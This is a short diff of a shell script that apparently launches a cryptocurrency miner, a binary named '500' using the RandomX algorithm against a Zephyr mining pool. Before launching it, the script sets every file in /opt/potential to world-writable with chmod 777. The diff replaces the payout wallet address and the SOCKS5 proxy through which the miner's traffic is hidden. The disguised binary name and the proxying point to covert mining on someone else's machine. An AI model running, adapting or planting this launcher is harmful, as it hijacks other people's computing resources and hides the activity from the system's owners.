@@ -1,2 +1,2 @@
 cd /opt/potential/ && chmod 777 * && ls
-./500 --algorithm randomx --pool sg.zephyr.herominers.com:1123 --tls true --wallet ZEPHs756uT1RV6kdirN9J74RcfUhJuT9C1qvHTqcfs6kJpeP5Cj4PngWQMFkE13fJzKgf9Ep9uadChW9DzorocVbV5EGbXQkzw7.tes --t 4 --proxy socks5://199.229.254.129:4145 --keepalive true
+./500 --algorithm randomx --pool sg.zephyr.herominers.com:1123 --tls true --wallet ZEPHs8EjEpB6hr6te6cR791ddFWFpVQTdUpoyTuWfuGmK1Uur2nYnkqLP4bhu48JEKh6qHQW7cxUW5ytDZzRzbtzKPnCZkCZpPh.tes --t 4 --proxy socks5://104.20.24.214:80 --keepalive true
